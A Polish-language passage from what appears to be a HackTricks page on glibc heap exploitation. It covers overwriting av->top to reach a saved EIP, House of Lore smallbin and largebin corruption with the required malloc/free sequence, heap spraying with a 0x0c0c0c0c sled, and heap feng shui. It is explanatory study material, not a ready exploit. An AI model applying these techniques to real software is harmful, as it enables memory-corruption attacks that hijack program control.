Drugą rzeczą jest zmiana av->top, aby wskazywał na obszar pamięci pod kontrolą atakującego, takiego jak stos. W av->top umieszczamy \&EIP - 8.

Musimy nadpisać av->top, aby wskazywał na obszar pamięci pod kontrolą atakującego:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim przechwytuje adres bieżącego kawałka wilderness (aktualne av->top), a remainder to dokładnie suma tego adresu i liczby bajtów żądanych przez malloc(). Dlatego jeśli \&EIP-8 znajduje się pod adresem 0xbffff224, a av->top zawiera 0x080c2788, to ilość, którą musimy zarezerwować w kontrolowanym malloc, aby av->top wskazywał na $EIP-8 dla następnego malloc(), będzie wynosić:

0xbffff224 - 0x080c2788 = 3086207644.

W ten sposób zostanie zachowany zmieniony av->top, a następne malloc będzie wskazywać na EIP i będzie można go nadpisać.

Ważne jest, aby rozmiar nowego kawałka wilderness był większy niż żądanie ostatniego malloc(). Innymi słowy, jeśli wilderness wskazuje na \&EIP-8, rozmiar zostanie dokładnie w polu EBP stosu.

**The House of Lore**

**Korupcja SmallBin**

Zwolnione kawałki są umieszczane w bin w zależności od ich rozmiaru. Ale zanim zostaną umieszczone, są przechowywane w unsorted bins. Kawałek nie jest natychmiast umieszczany w swoim binie, ale pozostaje w unsorted bins. Następnie, jeśli zostanie zarezerwowany nowy kawałek i poprzedni zwolniony może być użyty, zostanie on zwrócony, ale jeśli zostanie zarezerwowany większy, zwolniony kawałek z unsorted bins zostanie umieszczony w odpowiednim binie.

Aby dotrzeć do podatnego kodu, żądanie pamięci musi być większe niż av->max\_fast (zazwyczaj 72) i mniejsze niż MIN\_LARGE\_SIZE (512).

Jeśli w binach znajduje się kawałek o odpowiednim rozmiarze, zostanie on zwrócony po odłączeniu:

bck = victim->bk; Wskaże poprzedni kawałek, to jedyna informacja, którą możemy zmienić.

bin->bk = bck; Przedostatni kawałek staje się ostatnim, jeśli bck wskazuje na stos, następnemu zarezerwowanemu kawałkowi zostanie przypisany ten adres

bck->fd = bin; Zamyka listę, aby wskazywała na bin

Potrzebne jest:
Zarezerwuj dwie pamięci malloc, tak aby pierwsza mogła zostać przepełniona po zwolnieniu drugiej i umieszczeniu jej w swoim binie (czyli zarezerwowano malloc większy niż drugi kawałek przed przepełnieniem).

Zarezerwowana pamięć, do której atakujący wybiera adres, jest kontrolowana przez atakującego.

Celem jest, jeśli możemy przepełnić stertę, która ma zwolniony kawałek pod nią i w swoim binie, możemy zmienić wskaźnik bk. Jeśli zmienimy wskaźnik bk i ten kawałek stanie się pierwszy na liście bin i zostanie zarezerwowany, oszukamy bin i powiemy mu, że następny kawałek na liście (następny do zaoferowania) znajduje się pod fałszywym adresem, który podaliśmy (na przykład na stosie lub GOT). W ten sposób, jeśli zostanie zarezerwowany kolejny kawałek i atakujący ma uprawnienia do niego, zostanie mu przydzielony kawałek na pożądanej pozycji i będzie mógł w nią pisać.

Po zwolnieniu zmodyfikowanego kawałka konieczne jest zarezerwowanie kawałka większego od zwolnionego, dzięki czemu zmodyfikowany kawałek opuści unsorted bins i zostanie umieszczony w swoim binie.

Gdy już znajdzie się w swoim binie, należy zmienić mu wskaźnik bk poprzez przepełnienie, aby wskazywał na adres, który chcemy nadpisać.

Następnie bin musi poczekać, aż malloc() zostanie wywołane wystarczająco wiele razy, aby ponownie użyć zmodyfikowanego bina i oszukać bin, sprawiając, że uwierzy, że następny kawałek znajduje się pod fałszywym adresem. Następnie zostanie przydzielony pożądany kawałek.

Aby wywołać podatność jak najszybciej, idealne jest: zarezerwowanie podatnego kawałka, zarezerwowanie kawałka do zmodyfikowania, zwolnienie tego kawałka, zarezerwowanie kawałka większego od tego, który zostanie zmodyfikowany, zmodyfikowanie kawałka (podatność), zarezerwowanie kawałka o takim samym rozmiarze co naruszony i zarezerwowanie drugiego kawałka o takim samym rozmiarze, który będzie wskazywał na wybrany adres.

Aby zabezpieczyć się przed tym atakiem, użyto standardowej weryfikacji, czy kawałek "nie" jest fałszywy: sprawdzane jest, czy bck->fd wskazuje na ofiarę. Innymi słowy, w naszym przypadku, jeśli wskaźnik fd\* fałszywego kawałka wskazuje na ofiarę na stosie. Aby ominąć to zabezpieczenie, atakujący musiałby być w stanie w jakiś sposób (prawdopodobnie przez stos) zapisać odpowiednio adres ofiary. W ten sposób wyglądałoby to jak prawdziwy kawałek.

**Korupcja LargeBin**

Wymagane są te same warunki co wcześniej i kilka dodatkowych, ponadto zarezerwowane kawałki muszą być większe niż 512.

Atak jest podobny do poprzedniego, czyli trzeba zmienić wskaźnik bk i potrzebne są wszystkie te wywołania malloc(), ale dodatkowo trzeba zmienić rozmiar zmodyfikowanego kawałka tak, aby ten rozmiar - nb był < MINSIZE.

Na przykład, trzeba ustawić rozmiar na 1552, aby 1552 - 1544 = 8 < MINSIZE (odejmowanie nie może być ujemne, ponieważ porównuje się wartość bez znaku)

Dodatkowo wprowadzono łatkę, aby sprawić, że atak będzie jeszcze trudniejszy.

**Rozpylanie sterty (Heap Spraying)**

Polega na zarezerwowaniu jak największej ilości pamięci dla sterty i wypełnieniu jej poduszką z nops zakończoną shellcodem. Dodatkowo jako poduszkę używa się 0x0c. Następnie próbuje się skoczyć do adresu 0x0c0c0c0c, więc jeśli jakaś adres zostanie nadpisany tą poduszką, skoczy tam. Podstawową taktyką jest zarezerwowanie jak największej ilości pamięci, aby zobaczyć, czy jakiś wskaźnik zostanie nadpisany, i skoczyć do 0x0c0c0c0c, mając nadzieję, że tam będą nops.

**Feng Shui sterty (Heap Feng Shui)**

Polega na utwardzaniu pamięci poprzez rezerwacje i zwalnianie, tak aby między wolnymi kawałkami pozostały zarezerwowane kawałki. Bufor do przepełnienia zostanie umieszczony w jednym z tych kawałków.

## Ciekawe kursy

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **Referencje**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
